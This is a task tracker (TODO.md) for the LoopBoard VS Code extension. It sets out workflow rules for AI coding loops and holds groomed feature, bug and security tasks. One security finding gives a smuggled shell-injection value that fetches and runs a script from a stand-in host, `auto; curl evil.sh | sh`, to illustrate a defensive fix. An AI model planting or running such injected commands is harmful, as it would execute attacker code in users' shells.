# TODO

Single task tracker. Completed tasks are moved to [DONE.md](DONE.md).

## Workflow

```
New → Backlog → In Progress → Review → Done (DONE.md)
                     ↕
                  Feedback
```

- **New** — proposed; groomed in place; leaves only via human `[x]`.
- **Backlog** — validated, claimable.
- **In Progress** — active; exactly one owner.
- **Feedback** — paused on human answers; returns to In Progress.
- **Review** — delivered; awaiting acceptance.
- **Done** — accepted; lives in `DONE.md`.

## Task format (v3)

All tasks live in the single `## Tasks` section; no per-phase headings. Phase = the `phase:`
field; to move a task, edit that field in place — never cut/paste a task between sections.
Task = checkbox line + indented `key: value` sub-bullets, one key per line, fixed order below.
The LoopBoard extension parses tolerantly, rewrites canonical form on save, and preserves
unrecognized lines verbatim (flagged).

```
- [ ] <Title — single line>
  - id: t-3f9a                          (stable short id; writer assigns if missing)
  - phase: new | backlog | inprogress | feedback | review
  - owner: @claude | unassigned
  - model: opus | sonnet | fable        (optional; absent = default model; Rule 15)
  - groomer: opus | sonnet | fable      (optional; absent = default model; Rule 14)
  - added: YYYY-MM-DD
  - started: YYYY-MM-DD                  (optional; set on move to In Progress)
  - promoted: YYYY-MM-DD                 (optional; set on New → Backlog)
  - completed: YYYY-MM-DD                (DONE.md only; set on acceptance)
  - worklog: YYYY-MM-DD, YYYY-MM-DD      (optional; append a date each active day)
  - link: <url>[, <url>]                 (optional; PR links)
  - depends on: t-xxxx[, t-yyyy]         (optional)
  - description: <free text; may wrap onto further 4-space-indented lines>
  - note: <human instruction to worker>  (optional; Rule 16)
  - question: ❓ <text>                   (repeatable, single line; Feedback & New)
    - answer: <text or blank>
  - feedback: ⚠️ <text>                   (Review only; Rule 13)
  - DELIVERED: <text; may wrap onto further 4-space-indented lines>   (Review only)
```

- `id:` = identity anchor; titles freely editable. `phase:` = column.
- `description:` carries detail; title stays one short line.
- Draft = `- [ ] DRAFT: <raw text>` + `id:`/`added:` (+ optional `model:`/`groomer:`; no
  `phase:` line — drafts are implicitly new); groomer expands it (Rule 14).

## Rules

1. `[x]` belongs to the human only; a worker never ticks it. `[x]` on New = promote to Backlog.
   `[x]` on Review = accepted → DONE.md. Workers perform all other phase moves and propose.
2. One worker per task. `owner: unassigned` → claim: set `owner: @you`, `started: <today>`,
   `phase: inprogress`. Owned by another, or in DONE.md → do not start a parallel copy.
3. Dates: `added:` entered tracker; `started:` work began; `promoted:` New → Backlog;
   `worklog:` append `<today>` each active day; `completed:` acceptance (recorded in DONE.md).
4. One `key: value` per sub-bullet, fixed order above. Move = edit `phase:` in place; never
   cut/paste.
5. Grooming ≠ approval: editing a New task's text is allowed; leaving New requires Rule 1.
6. Unsure → set `phase: feedback`, add `question: ❓ <text>` each with its own `- answer:`
   sub-bullet beneath, stop working the task. Resume gated by Rule 10. No `[x]` involved.
7. All changes deliver via PR from a `task/<id>` branch off `main` (e.g. `task/t-3f9a`);
   never commit to `main` or a differently-named branch. Record the PR in `link:` before
   setting `phase: review`. A Review task without a PR link is incomplete.
8. Prefix `question:` with ❓ and `feedback:` with ⚠️.
9. git worktrees forbidden (they break pre-commit hooks assuming `.git` is a directory;
   `--no-verify` forbidden). Use the normal checkout: fetch latest `main`, branch off `main`,
   commit, open the PR from there (Rule 7).
10. Resume a Feedback task only when EVERY `question:` has a filled `answer:`. Any blank
    answer → leave it parked; do none of its work.
11. Set `phase: inprogress` (+ `owner:`, `started:`) BEFORE any work or research on a task —
    never investigate a task still in New/Backlog/Feedback.
12. No stranded work: every change from working a task ends in a PR (draft PR if unfinished)
    with its link on the task before the session ends.
13. A Review task's `feedback:` line = change request, not a gate. Unaddressed → move to
    In Progress, address, return to Review with updated DELIVERED and the feedback line
    removed. `[x]` on Review still = accepted → DONE.md.
14. New/DRAFT grooming is routed by `groomer:` (absent = default model): the loop whose model
    matches `groomer:` owns it and delegates to a subagent (Agent tool) of that groomer model —
    never inline in the main loop. Subagent expands title/`description:`/scope and records
    findings on the task. Human decisions = single-line `question: ❓` sub-bullets with blank
    `answer:` lines (never an "OPEN QUESTIONS" prose paragraph) so the board can surface them.
    A New task with any filled `answer:` → re-groom via the same subagent: incorporate the
    answer, fold the decision into `description:`, delete the resolved `question:`/`answer:`
    pair (mirrors Rule 16). A still-present filled answer = not yet incorporated. `model:`
    never gates grooming.
15. Claim tasks by `model:` (Backlog onward; absent = default model). Never claim a
    task whose `model:` names a different model. New-phase routing uses `groomer:` instead
    (Rule 14).
16. Honor `note:` lines (human instructions): apply, append `<today>` to worklog, delete the
    line. A lingering `note:` = not yet applied.
17. GLOBAL WIP LIMIT: at most ONE task In Progress across ALL models — all loops share one
    checkout, which can only sit on one `task/<id>` branch at a time. Before claiming a
    Backlog task or resuming a Feedback task, check for ANY task with `phase: inprogress`
    (any owner, any model); if one exists, do not start work — reconcile only and wait for a
    later pass. Tie-break for simultaneous claims: right after claiming, re-read TODO.md; if
    another task also just moved to In Progress, the claim sitting LOWER in the file is
    released (revert its `phase:`/`owner:`/`started:`) and that model backs off until the
    next pass.

Legend: `[ ]` awaiting your gate · `[x]` you approved.

---

## Tasks

- [ ] Restore PR-based delivery once a git remote exists (revert the temporary commit-only rule)
  - id: t-pr01
  - phase: new
  - added: 2026-07-11
  - worklog: 2026-07-12, 2026-07-13, 2026-07-14, 2026-07-15
  - description: The remote now exists, so the temporary "deliver by commit, not PR" measure can be
    reverted. HISTORY: the commit-only rule was introduced 2026-07-11 (commit c823d5a) because the
    repo had no git remote; the remote + single-commit squash + push landed 2026-07-14 via t-8823,
    so `origin` = git@github.com:SinnConsulting/LoopBoard.git (private) and origin/main = 8f479db
    "init: LoopBoard". All the earlier branch-push / remote-creation / secret-scan steps are DONE or
    moot and have been dropped from this task (regroom 2026-07-15).
    REMAINING ACTIONABLE SCOPE — revert the delivery policy from commit-only back to PR-based:
    (1) Rule 7: replace the "TEMPORARY (no remote yet): deliver by COMMIT, not PR" text with the
    original PR requirement — "You MUST ALWAYS add a PR ... never commit to main directly ... A
    Review task with no PR link is incomplete."
    (2) Rule 12: replace the "Never leave work stranded — always COMMIT (TEMPORARY: no PR ...)" text
    with the original — "If you started working and have code to commit, ALWAYS open a PR — never
    leave work stranded."
    (3) Rule 9: reconcile its delivery clause so it consistently says "commit and open the PR from
    that checkout (per Rule 7)" with no commit-only carve-out (its worktree prohibition stays as-is).
    (4) Task-format `link:` comment (the `link: <url>` sub-bullet doc): ensure it reads as PR links,
    not commit/branch references.
    (5) Automation /loop prompt at the bottom: ensure its finish step reads "open a PR (Rule 7),
    record its link, and move it to Review" with no commit-only wording anywhere in the block.
    Note: several of (3)/(4)/(5) may already read PR-first (they were only half-migrated) — the job
    is to make delivery language consistently PR-based across all five spots and remove any lingering
    "TEMPORARY"/commit-only phrasing.
    This unblocks t-a37f (marketplace publish) sequencing, which waits on this policy revert plus a
    pushed repo.
    REGROOMED 2026-07-15 by Opus subagent (Rule 14); left in New for your promotion.
  - question: ❓ Delete the local-only backup branches (task/* delivery branches and backup-pre-loopboard, which hold the pre-squash 33-commit history) now that main is squashed and pushed, or keep them as an offline safety net?
    - answer:

- [ ] Fix first-click reveal race: sidebar phase click opens the board on New instead of the clicked phase
  - id: t-b4d1
  - phase: new
  - model: opus
  - groomer: fable
  - added: 2026-07-15
  - worklog: 2026-07-15
  - description: User-reported: clicking a phase in the sidebar's phase overview (e.g. "Review")
    while the board panel is CLOSED opens the board on the New tab; the second click works.
    DIAGNOSIS (fable, 2026-07-15, verified in source): PRIMARY CAUSE — the reveal is posted
    before the webview exists, then forgotten. In src/controller.ts:152-156 the `reveal` case
    runs synchronously: store `pendingReveal`, call `openBoard()`, then `flushReveal()`. On the
    first click the panel is only just created — `BoardPanel.current` is set immediately, but
    the webview's HTML/script haven't loaded, so its `window.addEventListener('message', …)`
    isn't attached yet. `flushReveal()` (controller.ts:68-73) sees `BoardPanel.current` and
    `this.lastBoard` both set (the sidebar keeps lastBoard fresh), posts the reveal into the
    void, and CLEARS `pendingReveal`. When the webview later sends `ready`, the handler calls
    `flushReveal()` again (controller.ts:122) — the mechanism meant for exactly this case — but
    the pending reveal was already consumed, so nothing is re-sent and the board renders its
    default tab (New). SECONDARY GUARD — the webview drops early reveals too: `revealTask` in
    media/board.js:628 starts with `if (!board) return;`, so a reveal arriving before the first
    board payload is also silently discarded. On the second click the panel is open and live,
    so the immediate flush is delivered — matching the "first time only" symptom.
    FIX DIRECTION: flush inline only when the panel ALREADY existed, otherwise leave
    `pendingReveal` for the `ready` handler — e.g. have `BoardPanel.show` report whether it
    created a fresh panel, or make `flushReveal` a no-op until the webview has signalled
    `ready`. Belt-and-braces option for the secondary guard: in board.js, stash an early
    reveal's phase/taskId and apply it when the first board payload arrives (only needed if
    a reveal can still beat the first `board` message after the primary fix).
    SCOPE: src/controller.ts (+ possibly src/panel.ts for a created-vs-existing signal from
    `BoardPanel.show`); media/board.js only if the secondary guard is addressed. VERIFY:
    controller/panel are VSCode-touching modules (not unit-testable here) — `make check` must
    pass, and the fix needs a manual F5 check: close the board panel, click "Review" in the
    sidebar phase overview, board must open ON the Review tab on the FIRST click (repeat for
    an attention row, e.g. the ❓-unanswered row targeting Feedback).
    GROOMED 2026-07-15 by fable (diagnosis done inline at the user's request in-session);
    left in New for your promotion.

- [ ] Support 1M-context loop variants: accept `opus[1m]`, `sonnet[1m]`, `fable[1m]` as model ids everywhere a model is chosen
  - id: t-c1a7
  - phase: new
  - model: opus
  - groomer: fable
  - added: 2026-07-20
  - worklog: 2026-07-20
  - description: The Claude Code CLI accepts a `[1m]` suffix on model ids (e.g. `--model opus[1m]`)
    to run that model with the 1M-token context window. All three models LoopBoard currently
    offers (opus, sonnet, fable) have 1M-capable variants. Add these as first-class model ids so
    a loop can be spawned with 1M context. TOUCH POINTS (all currently hardcode the 3-value
    list): src/model.ts:5 (`Model` union), the duplicated `KNOWN_MODELS` arrays in
    src/parser.ts:57 and src/merge.ts:21 — consider a single exported list in model.ts so a
    future model is added in one place — src/terminals.ts:8-11 (`MODELS` list drives the
    sidebar Loops rows, terminal names like "Claude Opus", AND the `isKnownModel` security
    allowlist from t-7d2b — the new ids must pass it), the webview model selects in
    media/board.js / media/sidebar.js, and src/loop.ts (bootstrap prompt says "You are running
    as model <model>" — the variant id should pass through verbatim so the worker claims only
    `model: opus[1m]` tasks; `[` `]` are shell-glob chars, but the argv is already
    single-quoted, so verify rather than re-quote). TODO.md GRAMMAR: `model:` and `groomer:`
    fields accept the suffixed ids; parser/writer round-trip tests must cover them. ROUTING:
    a `[1m]` variant is a DISTINCT model id — `opus[1m]` is not `opus` for claiming, one-worker
    -per-task, or the default-model rule (Rule 15); state this explicitly in the Automation
    rules if grooming finds it ambiguous. VERIFY: `make check` green; manual F5 — spawn an
    `opus[1m]` loop and confirm the terminal boots with the 1M model and the prompt names it.
  - question: ❓ Should the sidebar Loops view list all six variants as separate rows (opus, opus[1m], sonnet, …), or keep three model rows with a per-row "1m" toggle that picks the variant at spawn time?
    - answer:

- [ ] Make the model list configurable: rename the built-in models or add fully custom model ids
  - id: t-e4d2
  - phase: new
  - model: opus
  - groomer: fable
  - added: 2026-07-20
  - worklog: 2026-07-20
  - depends on: t-c1a7
  - description: Today the model set is hardcoded to opus/sonnet/fable in five places (see t-c1a7's
    touch-point list). Let the user (a) override the display naming of the built-ins and (b) add
    entirely custom model ids (e.g. `haiku`, a dated snapshot like `claude-opus-4-8`, or an alias
    their org exposes) that then appear everywhere models are chosen: the sidebar Loops rows, the
    board card model select, the `model:`/`groomer:` fields in TODO.md, and the spawned
    `claude --model <id>` terminal. LIKELY SHAPE: a `loopBoard.models` setting (array of
    `{id, name?}`) merged with or replacing the built-in list, exposed from a single source in
    src/model.ts (t-c1a7's consolidation makes this the one edit point). HARD PARTS to groom:
    (1) SECURITY — `isKnownModel` (src/terminals.ts, t-7d2b) is an allowlist precisely because
    webview-supplied ids reach a shell line; user-configured ids must be validated with a strict
    character allowlist (e.g. `[A-Za-z0-9._\[\]-]+`) at the config boundary (t-5e1a covers config
    splicing) rather than trusted verbatim. (2) PARSER — `KNOWN_MODELS` currently drops unknown
    `model:` values on parse; with a configurable list the parser either needs the list injected
    or must preserve any well-formed model token and let the UI flag unknown ones (leaning
    toward the latter to keep parser.ts pure and settings-free — grooming should decide and
    record it in DECISIONS.md). (3) TYPES — the `Model` string-union type becomes a plain
    validated string; check nothing relies on union exhaustiveness. (4) ROUTING — Rule 15's
    default-model rule and the Automation block's claim-by-model logic must work with arbitrary
    ids (they already pass the id verbatim, so likely fine — verify). VERIFY: `make check`
    green with round-trip fixtures covering a custom id; manual F5 — add a custom model in
    settings, see it in sidebar + board select, spawn its loop, terminal runs
    `claude --model <custom-id>`.
  - question: ❓ Should custom models MERGE with the built-in opus/sonnet/fable list (built-ins always present) or fully REPLACE it when the setting is non-empty?
    - answer:

- [ ] Thread question answers like Reddit comments: repeatable, author-attributed replies instead of one flat answer blob
  - id: t-b2c1
  - phase: new
  - added: 2026-07-15
  - description: Today each `question:` carries exactly ONE `answer:` line, so any back-and-forth
    (user gives a short direction, groomer elaborates, user corrects) gets mashed into a single
    prose blob with authorship and dates buried inside it — see t-027d's icon-ownership answer:
    "THIS task owns it (elaborated 2026-07-15 by the fable groomer at the user's direction...)".
    You can't tell at a glance who said what, when, or in what order. Replace the single answer
    with a REPLY THREAD per question — rendered in the board like a Reddit comment thread: each
    reply shows its author (user vs. agent/model) and date, indented under the question, newest
    appended at the bottom, with an input box to add the next reply rather than editing one blob.
    GRAMMAR (v3 extension, backward compatible): under a `question:` sub-bullet, allow repeatable
    `- reply (<author>, <YYYY-MM-DD>): <text>` sub-sub-bullets in file order, where <author> is
    `user` or a model name (`opus`/`sonnet`/`fable`). The existing `- answer:` line stays parseable:
    a non-blank `answer:` is treated as a single user reply (undated); a blank `answer:` = no
    replies yet. DECIDE whether the writer canonicalizes an old `answer:` into a `reply (user)` line
    or keeps emitting `answer:` until a thread exists (migration question below). Document the
    grammar change in the *Task format* block at the top of TODO.md and reconcile Rules 6 and 10
    wording ("filled-in answer" → "a reply thread whose LAST reply is from the user" — an agent
    asking a follow-up must NOT count as answered, that's the whole point of threading).
    WORK ITEMS: (1) model.ts: `Question { text, replies: Reply[] }` with
    `Reply { author, date, text }`; derive `answered` = replies non-empty AND last reply author is
    `user`. (2) parser.ts: parse `reply (...)` sub-sub-bullets (tolerant on spacing/case, like the
    existing `answer:` match at src/parser.ts:183); keep accepting legacy `answer:`. (3) writer.ts:
    emit the canonical thread form; round-trip fixpoint + idempotence fixtures for mixed
    legacy/threaded files (the core invariant — parse→write→parse must stay a fixpoint). (4)
    board.js `renderQuestions` (media/board.js:485): render the thread Reddit-style — author chip
    (color-code user vs. agent via VSCode theme variables), date, replies indented under the ❓
    question, then a reply box; replies are APPEND-ONLY from the board (posting sends a new-reply
    patch, never rewrites prior replies — appends can't same-field-conflict with a concurrently
    writing loop the way the current whole-answer overwrite can; keep the `pendingBoard`
    focus-deferral working for the reply box). Board-posted replies get `author: user` and today's
    date automatically. (5) store.ts patch plumbing: a `reply` patch appends to question i's
    thread (field-level patch per CLAUDE.md rule 4); update the questions-answered counter and
    the Feedback-column badge to the new `answered` definition. (6) Update the Automation /loop
    prompt + Rules 6/10 text so loop workers write `reply (<model>, <date>):` lines instead of
    overwriting `answer:`, and resume only when the LAST reply on every question is the user's.
    (7) `make check` green; manual F5 pass for the thread UI added to VERIFICATION.md's checklist.
    RISKS: this touches the round-trip core (parser+writer) — the existing fixture suite must
    stay green, incl. the v1 TODO.md HTML-comment fixtures; Rule 10's resume gate changes meaning,
    so an un-updated loop prompt could resume on an agent's own follow-up reply (ship the prompt
    edit in the same change as the parser); multi-line replies need the same 4-space-continuation
    handling as `description:` or long replies will land in unknownLines.
  - question: ❓ Migrate legacy `answer:` lines on save (writer canonicalizes them into `reply (user)` — clean, but rewrites history with a guessed author/date), or keep emitting `answer:` for single-reply questions and only switch to the thread form once a second reply exists?
    - answer:
  - question: ❓ Author attribution for agent replies: the model name (opus/sonnet/fable — matches the loop terminals) or a role label like `groomer`/`worker` (matches WHY it replied)? The screenshot's blob used both ("fable groomer").
    - answer:

- [ ] Add a "Sync template" board button that copies media/todo-template.md to disk and steers a Claude Code session to migrate the workspace's TODO.md onto the current format
  - id: t-c91a
  - phase: new
  - groomer: fable
  - added: 2026-07-15
  - description: Motivated by 2026-07-15: `media/todo-template.md` (the file `onCreateFiles` in
    `src/controller.ts` writes only when a workspace has no `TODO.md` yet) had silently drifted
    out of sync with the live grammar — it was still v2 (per-phase headings, "always PR" delivery
    rules) while `TODO.md`'s own Workflow/Task-format/Rules/Automation text had moved to v3 (flat
    `## Tasks` section + `phase:` field). Nothing catches this drift automatically: `make test`
    only checks the template parses to zero tasks and round-trips as a fixpoint, not that its
    prose matches the current grammar (see the "MUST NOT FORGET" note added to `VERIFICATION.md`
    the same day). This story is about giving the user a way to pull an *existing* workspace's
    `TODO.md` back onto the current template without a human manually diffing the two files.
    Scope: add a button (board toolbar or sidebar — TBD, see question below) that, when clicked:
    (1) copies the extension's current `media/todo-template.md` onto disk in the workspace (exact
    target path/name TBD — could overwrite `TODO.md` directly, or drop a sibling reference file
    for comparison, since `TODO.md`'s actual tasks must be preserved, not clobbered); (2) then
    kicks off (or primes) a Claude Code session/prompt instructing it to diff the workspace
    `TODO.md`'s Workflow/Task-format/Rules/Automation sections against the fresh template and
    migrate the structural/prose parts (headings, rule text, phase-field grammar) to match, while
    leaving every actual task's content, `id:`, `phase:`, and metadata untouched. This is
    distinct from `onCreateFiles` (which only fires for a workspace with no `TODO.md` at all) —
    here the file already exists and has real tasks in it, so it's a migrate, not a scaffold.
  - question: ❓ Where should the "Sync template" button live — the board toolbar (`media/board.*`), the sidebar (`media/sidebar.*`), or a command-palette command? And should it require a confirmation step before touching `TODO.md`, given it's the source of truth for in-flight work?
    - answer: It should live in the Settings
  - question: ❓ How should it invoke Claude Code to do the migration — reuse the existing `terminals.ts` pattern (spawn a terminal, paste a prompt, per the TUI-paste caveats already documented in CLAUDE.md), or some other mechanism? And should the copied template land as `TODO.md` directly, a temp/reference file the prompt is told to diff against, or something else — the actual tasks currently in `TODO.md` must survive the sync verbatim.
    - answer: It should take a backup of the current one to TODO.md.bkp and then create our brand new copy in the root dir and then migrate the tasks and differences. In the phase of migration it should ask the user for uncertainties (e.g. if the user has their own LOOP configuration etc. which deviates drastically from the plugin template.

- [ ] Publish LoopBoard to Open VSX so non-Microsoft VS Code builds (VSCodium, Gitpod, Theia) can install it
  - id: t-49f4
  - phase: new
  - model: sonnet
  - groomer: fable
  - added: 2026-07-15
  - worklog: 2026-07-18
  - description: Expanded from the DRAFT "Also add the extension to https://open-vsx.org/ to be
    findable and accessible easily without the propritery Microsoft VSCode."
    Mirror Marketplace releases to Open VSX (https://open-vsx.org) so users of VSCodium,
    Gitpod, Eclipse Theia, and other non-Microsoft VS Code builds can find and install
    LoopBoard without the proprietary Marketplace. The same release .vsix works for both
    registries — no repack needed. WORK ITEMS: (1) HUMAN one-time setup: create an Eclipse
    Foundation account (GitHub username must match the one used on open-vsx.org), log into
    open-vsx.org via GitHub, link the Eclipse account and sign the Publisher Agreement, then
    generate an open-vsx.org access token and store it as GitHub Actions secret OVSX_PAT on
    SinnConsulting/LoopBoard. (2) Create the namespace matching package.json publisher:
    `npx --yes ovsx create-namespace SinnConsulting -p $OVSX_PAT` (one-time; run in CI or a
    disposable `docker run node:22` per the no-host-tooling rule). (3) Extend
    .github/workflows/publish.yml — after the existing vsce step, which already downloads
    loopboard-todo-<version>.vsix from the GitHub Release — with:
    `npx --yes ovsx publish --packagePath loopboard-todo-${{ inputs.version }}.vsix
    -p "${{ secrets.OVSX_PAT }}"` (exact shape pending the workflow-placement decision below).
    (4) Verify the listing at open-vsx.org/extension/SinnConsulting/loopboard-todo and note
    the outcome in VERIFICATION.md. Prereqs already satisfied: package.json has
    `"license": "MIT"` and a LICENSE file exists (ovsx rejects unlicensed extensions).
    RISKS/caveats: Eclipse account creation, agreement signing, and token generation are
    human-only steps — CI work is blocked until OVSX_PAT exists; namespace ownership
    verification is optional (unverified namespaces show a warning badge; claiming ownership
    goes through an EclipseFdn/open-vsx.org GitHub issue) — decide below; Open VSX runs
    automated scans (secrets/blocklist) that can reject an upload, so treat the first publish
    as needing a manual check.
    GROOMED 2026-07-18 by Fable subagent (Rule 14); left in New for your promotion.
  - question: ❓ Where should the ovsx publish run: as an extra step in the existing manual publish.yml (both registries in one dispatch), as a separate manual workflow, or automatically on every release in release.yml?
    - answer:
  - question: ❓ Should we backfill the current v1.0.1 .vsix to Open VSX immediately once the token exists, or wait for the next release?
    - answer:
  - question: ❓ File the optional namespace-ownership verification request for SinnConsulting (removes the "unverified" warning badge; requires a GitHub issue signed off by you), or skip it for now?
    - answer:

- [ ] Make DRAFT cards on the board readable: proper title/description layout instead of one long italic blob
  - id: t-6d4c
  - phase: review
  - owner: @claude
  - added: 2026-07-18
  - started: 2026-07-18
  - promoted: 2026-07-18
  - worklog: 2026-07-18, 2026-07-19
  - link: https://github.com/SinnConsulting/LoopBoard/pull/3 (task/t-6d4c @ b92f324; pushed + PR opened 2026-07-19 once the SSH key was added)
  - description: User-reported with a screenshot comparing two cards: a DRAFT card (t-49f4, the
    open-vsx one) renders its ENTIRE raw text as a single centered italic title line, while a
    normal groomed card (e.g. "Security: validate loopBoard config values…") gets the readable
    layout — bold left-aligned title, owner/added meta row, then the description as flowing body
    text. Long drafts are hard to scan and look broken next to real cards. ROOT CAUSE: a draft is
    stored as `- [ ] DRAFT: <raw text>` with the whole prompt collapsed into the title
    (src/store.ts createDraft: `title: 'DRAFT: ' + text.trim().replace(/\s+/g, ' ')`) and no
    `description:`, so the board's title slot carries paragraph-length text. SCOPE: make a DRAFT
    card read like the normal card anatomy — keep the DRAFT badge / "the loop will structure this
    into a story" hint / Groom-with select, but present the raw text as left-aligned body text in
    the description area (not an italic centered title). Likely rendering-only in media/board.js
    (+ board.css); alternatively split at creation time (first line/sentence → title, rest →
    `description:`) in store.ts — see question below. Round-trip invariant: whatever is chosen
    must not break parse→write→parse on existing single-line drafts, and the groomer must still
    receive the full raw text. `make check` green; visual result needs a manual F5 check (add to
    VERIFICATION.md's manual list).
    2026-07-18 (opus loop): claimed from Backlog to begin work, but the single groom question below
    (fix at RENDER time in media/board.js vs. at CREATION time in src/store.ts) determines the whole
    approach and which files are touched — parked in Feedback per Rule 6 rather than guess. Resumes
    once the answer is filled in.
  - question: ❓ Fix at RENDER time only (board.js styles the draft's raw text as body copy under a short "DRAFT" title — no file-format change), or at CREATION time in store.ts (split the input into a short title + `description:` body — cleaner cards, but changes what the groomer sees and how existing drafts look)?
    - answer: Render time
  - DELIVERED: task/t-6d4c @ b92f324 — render-time fix per your "Render time" answer, no store.ts/format
    change. media/board.js renderDraft: the Draft badge + "the loop will structure this into a story"
    hint now form a label row ON TOP (like a normal card's title/meta), and the raw draft text renders
    BELOW as left-aligned body copy. media/board.css: `.draft-text` dropped the italic muted title
    styling for foreground-color body copy (line-height 1.6, left-aligned); added `.draft-head-row`;
    `.draft-edit` de-italicized to match. Added a DRAFT-card readability check to VERIFICATION.md's
    manual F5 list. `make check` green (tests pass, package builds — loopboard-todo-1.0.1.vsix, 31
    files). NOT F5-verified: the visual result in a real VS Code window (headless session) — the
    manual check covers it. Delivery is the local commit b92f324 on task/t-6d4c; `git push` to origin
    was denied (no SSH key in this session), so no PR link — mirrors the commit-only delivery of the
    recent CI/logo tasks under the current Rule 7.

- [ ] Security: validate loopBoard config values before splicing them into the loop terminal shell command
  - id: t-5e1a
  - phase: new
  - added: 2026-07-18
  - description: From the 2026-07-18 repo security scan (finding 1, medium). src/terminals.ts:73
    builds `claude --permission-mode ${cfg.permissionMode} --model ${model}` and sends it to a
    terminal, with `cfg.permissionMode` read raw via `getConfiguration().get()` (src/extension.ts:22,
    src/controller.ts:37). The enum in package.json only constrains the settings UI — a
    `.vscode/settings.json` inside a cloned repo can set `loopBoard.permissionMode` to any string,
    e.g. `auto; curl evil.sh | sh`, which executes in the user's shell when they click Start Loop.
    Workspace Trust gates activation, but users routinely trust cloned repos. FIX: at read time,
    validate `permissionMode` against the same allowlist as the package.json enum (fall back to
    `auto` + warn on mismatch), and validate `loopInterval` matches `^\d+[smh]$` before rewriting
    the `/loop <interval>` line in src/loop.ts / passing it to buildLoopCommand. Keep the validation
    in a pure module (or the thinnest vscode wrapper) so it's unit-testable per CLAUDE.md; add tests
    for accepted/rejected values. `make check` green.

- [ ] Security: validate webview-supplied model ids in controller message handling
  - id: t-7d2b
  - phase: review
  - owner: @claude
  - added: 2026-07-18
  - started: 2026-07-19
  - promoted: 2026-07-19
  - worklog: 2026-07-19
  - link: https://github.com/SinnConsulting/LoopBoard/pull/2 (task/t-7d2b @ 871c629; pushed + PR opened 2026-07-19 once the SSH key was added)
  - description: From the 2026-07-18 repo security scan (finding 2, low, defense in depth).
    src/controller.ts:133-140 handles `spawnLoop`/`recycleLoop`/`stopLoop` with `msg.model as Model`
    — a compile-time cast, no runtime check — and the value lands in the terminal shell line at
    src/terminals.ts:73. The CSP-hardened webview makes compromise unlikely, but the extension host
    should not trust webview messages: check `msg.model` against the known model ids
    (opus/sonnet/fable) and ignore the message otherwise. Keep the id allowlist next to the
    MODELS list so they can't drift. The related `openLink` hardening is its own task (t-9f3b).
    `make check` green.
  - DELIVERED: task/t-7d2b @ 871c629 — added an exported `isKnownModel(x): x is Model` runtime
    allowlist in src/terminals.ts directly beneath the MODELS list (so the two can't drift), and used
    it in src/controller.ts's `spawnLoop`/`recycleLoop`/`stopLoop` handlers to replace the unchecked
    `msg.model as Model` casts — the host now ignores any webview loop message whose model isn't
    opus/sonnet/fable, so an unknown id can never reach the terminal shell line (terminals.ts:73).
    Also updated the controller import. No behavior change for valid ids. `make check` green (build
    typechecks the new export/import + tests 0 failures + package builds — loopboard-todo-1.0.1.vsix,
    31 files). controller.ts/terminals.ts are VSCode-touching modules, so no unit test was added
    (per CLAUDE.md); the existing manual loop-button F5 check covers it. Delivery is local commit
    871c629 on task/t-7d2b; `git push` to origin was denied (no SSH key in this session), so no PR
    link — commit-only delivery under the current temporary Rule 7.

- [ ] Security: re-validate the URL scheme on the extension-host side before openExternal
  - id: t-9f3b
  - phase: new
  - added: 2026-07-18
  - description: From the 2026-07-18 repo security scan (finding 3, low, defense in depth). When a
    markdown link on a card is clicked, the webview sends `{type: 'openLink', url}` and the host
    calls `vscode.env.openExternal(vscode.Uri.parse(String(msg.url)))` on whatever arrived
    (src/controller.ts:144). The http/https check exists only in the webview (media/board.js:439)
    — the low-privilege, less-trusted side of the boundary. If the webview were compromised or the
    JS check regresses, the host would open `file://` or arbitrary protocol-handler URLs. FIX: in
    the `openLink` case, parse the URL and only call `openExternal` when the scheme is `http` or
    `https`; silently drop (or warn on) anything else. One-line check; controller.ts is a
    VSCode-touching module, so no unit test — `make check` green plus the existing manual link
    -click check.

- [ ] Build a side-by-side LOCAL DEV variant of the extension (distinct identity + placeholder logo) with auto-install into VS Code
  - id: t-dev1
  - phase: new
  - added: 2026-07-18
  - description: Goal: a locally built flavor of LoopBoard that can be installed ALONGSIDE the
    upstream Marketplace release (SinnConsulting.loopboard-todo, currently v1.0.1) without
    overlapping it, so the user can dogfood work-in-progress builds while keeping the released
    extension installed — and tell them apart at a glance via a deliberately different placeholder
    logo (any random symbol; it only has to NOT look like the real LoopBoard mark).
    WHAT "NOT OVERLAPPING" ACTUALLY REQUIRES (grounded in package.json as of v1.0.1):
    (a) Extension identity: VS Code keys installs on `publisher.name`, so the dev build must ship a
    different `name` (e.g. `loopboard-todo-dev`) and a marked `displayName` (e.g. "LoopBoard
    (Dev)"). (b) Runtime contributions: identity alone is NOT enough for both to RUN — both builds
    would register the same `loopBoard.*` command ids (registerCommand throws on the second
    registration), the same activity-bar view-container/view ids, and read the same `loopBoard.*`
    configuration keys. A true side-by-side dev build must namespace these (e.g. `loopBoardDev.*`
    + a `-dev` container id) — see the scope question below, since this ranges from a sed-style
    manifest rewrite to also touching every `registerCommand`/`getConfiguration` call site in
    src/. (c) Logo: swap the top-level `icon` (media/loopboard-icon-128.png) and the activity-bar
    `media/icon.svg` content for an obviously-different placeholder symbol in the dev build only.
    BUILD MECHANISM: a `make package-dev` target (Docker-wrapped like everything else) that stages
    the repo into a temp dir (or patches on the fly), rewrites package.json (name/displayName/icon
    and, per the scope decision, contribution ids), swaps the icon assets, then runs the existing
    `vsce package --no-dependencies` flow → `loopboard-todo-dev-<version>.vsix`. The working tree
    must stay clean — the rewrite happens only in the staging copy, never committed.
    AUTO-INSTALL CONCEPT (deliverable includes writing this up in PLAN.md or a docs section):
    a `make install-dev` target that depends on `package-dev` and runs
    `code --install-extension <dev.vsix> --force` — the `code` CLI ships with VS Code, so this
    respects the no-host-tooling rule (host assumes Docker, make, git, and VSCode; `code` is part
    of VSCode). `--force` makes reinstalls over an existing dev build silent. Document the caveat
    that an already-running Extension Host needs a window reload to pick up the new build, and
    decide (question below) whether install should be manual-only (`make install-dev`) or hooked
    into `make check` for an always-fresh dev install. VERIFY: `make check` stays green and
    untouched for the normal flavor; dev flavor verified by installing both the Marketplace build
    and the dev .vsix in one VS Code instance — both must appear in the Extensions view with
    distinct names/icons, and (if full namespacing is in scope) both activity-bar containers and
    command sets must work in the same window. That last part is a manual check for
    VERIFICATION.md's list — a headless session cannot drive VS Code.
  - question: ❓ How deep should the de-overlap go: IDENTITY-ONLY (different name/displayName/icon — both installable, but only one should be enabled at a time since commands/views would collide) or FULL NAMESPACING (also rewrite `loopBoard.*` command/view/config ids in the dev build so both run simultaneously — more moving parts in the build script and src/ must read ids from one place)?
    - answer:
